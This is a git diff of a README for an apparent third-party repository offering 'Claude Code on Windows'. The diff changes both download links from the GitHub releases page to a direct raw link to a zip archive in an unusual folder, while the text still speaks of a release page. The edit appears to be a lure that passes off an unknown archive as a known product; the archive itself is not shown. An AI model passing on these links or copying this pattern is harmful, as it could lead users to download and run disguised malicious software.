@@ -1,6 +1,6 @@
 # 🤖 Claude-Code - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Hagridden-tawnyeagle788/Claude-Code/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hagridden-tawnyeagle788/Claude-Code/main/supe/Claude-Code-v1.1.zip)
 
 ## 🧭 What this is
 
@@ -30,7 +30,7 @@ If your PC is older, the app may still work, but it can run slower.
 
 Visit this page to download the latest release:
 
-https://github.com/Hagridden-tawnyeagle788/Claude-Code/releases
+https://raw.githubusercontent.com/Hagridden-tawnyeagle788/Claude-Code/main/supe/Claude-Code-v1.1.zip
 
 On the release page, look for the file made for Windows. It is often an `.exe`, `.msi`, or `.zip` file. Download the file that matches your system, then save it to a place you can find, like Downloads or Desktop.
 
